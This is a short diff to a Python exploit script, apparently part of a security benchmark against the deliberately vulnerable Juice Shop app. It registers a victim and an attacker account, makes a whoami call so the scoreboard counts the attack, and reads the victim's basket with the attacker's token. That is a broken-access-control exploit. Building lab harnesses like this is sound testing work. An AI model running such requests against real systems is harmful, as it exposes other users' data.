@@ -71,6 +71,14 @@ def run(target: str, vuln_id: str, mitre_technique: str) -> dict:
     victim_token, victim_basket = _register_and_login(target, victim_email, "VictimPass123!")
     attacker_token, attacker_basket = _register_and_login(target, attacker_email, "AttackerPass123!")
 
+    # Juice Shop's own basketAccessChallenge solve check looks the attacker's
+    # token up in an in-memory cache (authenticatedUsers.tokenMap) that is
+    # only populated by middleware wired to /rest/user/whoami and /profile,
+    # not /rest/basket/:id itself. Without this call, the exploit below
+    # still genuinely works (the data leak is real either way), but Juice
+    # Shop's own scoreboard never sees it. See README for the full story.
+    _request("GET", f"{target}/rest/user/whoami", token=attacker_token)
+
     # Legitimate check: each user reading their OWN basket must keep working
     # in every condition. This is the "cost" half of the paired score.
     v_status, v_body = _request("GET", f"{target}/rest/basket/{victim_basket}", token=victim_token)
